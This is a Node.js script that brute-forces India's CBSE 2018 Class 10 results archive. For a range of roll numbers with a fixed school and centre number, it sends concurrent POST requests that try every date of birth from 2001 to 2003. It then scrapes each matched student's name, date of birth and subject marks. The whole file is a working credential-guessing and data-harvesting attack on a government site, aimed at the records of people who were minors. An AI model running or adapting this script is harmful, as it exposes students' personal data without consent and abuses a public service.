const axios = require('axios');
const qs = require('qs');
const cheerio = require('cheerio'); // Ensure cheerio is imported at the top level

async function solve(regn, DOB, schno, ccno) {
  let data = qs.stringify({
    'regno': regn,
    'dob': DOB,
    'sch': schno,
    'cno': ccno,
    'B2': "submit"
  });

  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'https://resultsarchives.nic.in/cbseresults/cbseresults2018/class10auz/class10th18.asp',
    headers: { 
      'Content-Type': 'application/x-www-form-urlencoded', 
      'accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7', 
      'origin': 'https://resultsarchives.nic.in', 
      'priority': 'u=0, i', 
      'referer': 'https://resultsarchives.nic.in/cbseresults/cbseresults2018/class10auz/Class10th18.htm', 
      'sec-ch-ua': 'Microsoft', 
      'sec-ch-ua-mobile': '?0', 
      'sec-ch-ua-platform': 'Windows', 
      'sec-fetch-dest': 'document', 
      'sec-fetch-mode': 'navigate', 
      'sec-fetch-site': 'same-origin', 
      'sec-fetch-user': '?1', 
      'upgrade-insecure-requests': '1'
    },
    data : data
  };

  const response = await axios.request(config);
  const parsedData = parseHtml(response.data);
  return parsedData;
}

function parseHtml(htmlContent) {
    const $ = cheerio.load(htmlContent);
    const rollNo = $('td:contains("Roll No:")').next('td').text().trim() || "N/A";
    const candidateName = $('td:contains("Candidate Name:")').next('td').text().trim() || "N/A";
    const DateofBirth = $('td:contains("Date of Birth")').next('td').text().trim() || "N/A";
  
    let totalMarks = 0;

    let Marks1 = parseInt($('td:contains("ENGLISH COMM.")').next('td').next('td').next('td').text().trim()) || 0;
    let Marks6 = parseInt($('td:contains("URDU COURSE-A")').next('td').next('td').next('td').text().trim()) || 0;
    let Marks2= parseInt($('td:contains("MATHEMATICS")').next('td').next('td').next('td').text().trim()) || 0;
    let Marks3= parseInt($('td:contains("086")').next('td').next('td').next('td').next('td').text().trim()) || 0;
    let Marks4= parseInt($('td:contains("SOCIAL SCIENCE")').next('td').next('td').next('td').text().trim()) || 0;
    let Marks5= parseInt($('td:contains("HINDI COURSE-A")').next('td').next('td').next('td').text().trim()) || 0;
    totalMarks=Marks1+Marks2+Marks3+Marks4+Marks5+Marks6;
    if (rollNo === "N/A") {
      return null;
    }
    console.log({Marks1, Marks2, Marks3, Marks4,Marks5});
    return { rollNo, candidateName, DateofBirth, totalMarks,  };
  }
  

async function main(){
  for(let roll=7264158; roll<=7264180; roll++){
    let solved=false;
    for(let year=2003; year>=2001; year-- ){
        if(solved){
            break;
        }
      for(let month=1; month<=12; month++ ){
        if(solved){
            break;
        }
        const dataPromises=[];
        for(let day=1; day<=31; day++ ){
          // Pad day and month with leading zeros if less than 10
          let paddedDay = day.toString().padStart(2, '0');
          let paddedMonth = month.toString().padStart(2, '0');
          let dob = `${paddedDay}/${paddedMonth}/${year}`;
          
          const data = solve(roll.toString(), dob, "52029", "7273" );
          dataPromises.push(data);
        }
         const resolveData= await Promise.all(dataPromises);
         resolveData.forEach((data)=>{
            if(data){
                console.log(data);
                solved=true;
            }
         })
      }
    }
  }
}

main();


